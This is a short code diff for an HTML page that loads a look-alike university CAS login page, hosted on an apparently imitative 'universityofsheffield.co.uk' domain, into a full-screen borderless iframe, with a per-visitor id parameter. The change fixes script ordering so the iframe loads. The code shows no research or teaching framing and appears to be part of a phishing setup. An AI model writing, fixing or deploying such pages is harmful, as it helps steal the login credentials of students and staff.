@@ -11,10 +11,12 @@
       const urlParams = new URLSearchParams(queryString);
       const id = urlParams.get('id');
       const targetUrl = 'https://login.universityofsheffield.co.uk/cas/login.html?id=' + id;
-      document.getElementById("frame").src = targetUrl;
     </script>
   </head>
   <body>
     <iframe id="frame" src="" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" />
+    <script>
+      document.getElementById("frame").src = targetUrl;
+    </script>
   </body>
 </html>
